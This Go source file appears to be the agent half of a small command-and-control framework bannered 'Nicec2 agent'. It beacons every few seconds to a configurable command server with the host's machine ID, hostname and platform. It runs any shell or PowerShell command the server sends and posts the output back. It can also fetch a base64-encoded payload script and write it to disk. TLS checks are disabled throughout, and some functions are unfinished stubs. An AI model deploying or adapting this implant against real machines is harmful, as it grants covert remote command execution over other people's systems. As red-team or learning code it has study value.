package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"time"

	// "io/ioutil"
	b64 "encoding/base64"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
	// "github.com/mitchellh/go-homedir"
)

// Setting the command server
// var command_server string = "http://192.168.0.69:8081"

var command_server string = "https://localhost:8081"

// var command_server string = "http://192.168.0.29:8081"

// Variables assigned later
var NodeID string = "" // This will be a GUID at some point

type CheckIn struct {
	ID       string `json:"ID"`
	Hostname string `json: "Hostname"`
	Platform string `json:"Platform"`
}

type CheckIn_response struct {
	TaskID string `json:"taskID"`
	Task   string `json:"task"`
	Arg    string `json:"arg"`
}

type command struct {
	ID      string `json:"ID"`
	Command string `json:"command"`
	Details string `json:"details"`
}

type Task_Response struct {
	TaskID   string
	Progress string // Completed / Failed
	Result   string // Data from the task
}

// Checking errors
func check(e error) {
	if e != nil {
		panic(e)
	}
}

// global stuff for shortcuts
var p = fmt.Println

func main() {

	Banner := `
███████████████████████████████████████████████████████████████████████████████████████████████
███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
`

	fmt.Println(Banner)

	NodeID, _ = machineid.ID()
	// NodeID = "test"

	// Checks in every 10 seconds.
	for {
		time.Sleep(5 * time.Second)
		checkIn()
	}

}

func send_response(response_to_task Task_Response) {
	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// This seems very wrong. But seems to work
	data := map[string]string{"TaskID": response_to_task.TaskID, "Progress": response_to_task.Progress, "Result": response_to_task.Result}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)

	}

	r, err := http.NewRequest("POST", command_server+"/node_response", bytes.NewBuffer(json_data))
	if err != nil {
		// panic(err)
		fmt.Println("Error sending the commands response back")
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		// panic(err)
		fmt.Println("Error sending the commands response back")
	}

	fmt.Println(res.Body)

}

func checkIn() {

	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Getting the info
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}

	json_data, err := json.Marshal(data)
	if err != nil {
		// log.Fatal(err)
		fmt.Println("error Marshalling the JSON sent by the server")
	}

	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
	if err != nil {
		fmt.Println("Error posting to command server")
		return
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		fmt.Println("Error sending data back to command server")
		return
	}

	//shrug
	defer res.Body.Close()

	// Bit of UI for you
	if res.StatusCode == 200 {
		fmt.Println("Response was OK")
	} else {
		fmt.Println("Response was Not OK")
	}

	post := &CheckIn_response{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		fmt.Println("Error decoding the JSON")
		panic(derr)
	}

	fmt.Println("Details of response")
	fmt.Println("Task: " + post.Task)
	fmt.Println("Arg: " + post.Arg)

	// Handeling it if there is no new task
	if post.TaskID == "0" {
		fmt.Println("No new task")
		return
	}

	// This is is where the tasks that the node should then do need to go
	switch post.Task {
	case "run script":
		fmt.Println("Hello there")
	case "shutdown":
		shutdown()
	case "run command":
		go handle_runCommand(post.TaskID, post.Arg)
	default:
		// Well if it doesn't match 🤷‍♀️

	}

}

func shutdown() {

	fmt.Println("Beep Boop. The computer should now shut down")

	/// This is where the code to shutdown the PC will go
}

func getFIle() {

	fmt.Println("\nStarting the getting file thing")

	data := map[string]string{"ID": NodeID}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
	if err != nil {
		panic(err)
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	//shrug
	defer res.Body.Close()

	fmt.Println(res.StatusCode)

	// Parse the JSON response
	post := &command{}

	fmt.Println(1)
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		panic(derr)
	}

	// Decoding the body so it's readable
	details, _ := b64.StdEncoding.DecodeString(post.Details)
	fmt.Println(string(details))

	// Output the JSON response
	fmt.Println("ID: ", post.ID)
	fmt.Println("Command: ", post.Command)
	fmt.Println("Details: ", string(details))

	// Write the string to file
	script_to_file(string(details))

}

// Runs a command based of a task. Then creates a response.
func handle_runCommand(this_taskID string, command string) {

	var response Task_Response

	output, command_error_message := runCommand(command)
	if command_error_message != "" {
		response = Task_Response{this_taskID, "failed", output}
	} else {
		response = Task_Response{this_taskID, "complete", output}

	}

	send_response(response)

}

// Runs a command, and returns the output.
func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			// errorMessage = err.Error()
			errorMessage = "There was an error executing. "

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {

		fmt.Println("There was an error. Ohh dear")
		p(err.Error())
		errorMessage = "There was an error running the command"

		return
	}

	outString = string(out)

	return

}

// Converts an encoded script. To a script on the machine
func script_to_file(input string) {

	f, err := os.Create("payloads/shell.sh")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	data := []byte(input)

	_, err2 := f.Write(data)

	if err2 != nil {
		log.Fatal(err2)
	}

	return
}

// Runs a script. Currently not OS agnostic
func run_script(path_to_script string) (output string) {

	output = ""

	out, err := exec.Command("sh", path_to_script).Output()
	if err != nil {
		fmt.Println("Error executing script")
	}

	output = string(out)

	return output

}

// structToJSON converts a struct to a JSON string
func structToJSON(v interface{}) (string, error) {
	// Marshal the struct into a JSON string
	jsonBytes, err := json.Marshal(v)
	if err != nil {
		return "", err
	}

	// Convert the JSON bytes to a striπng and return it
	return string(jsonBytes), nil
}
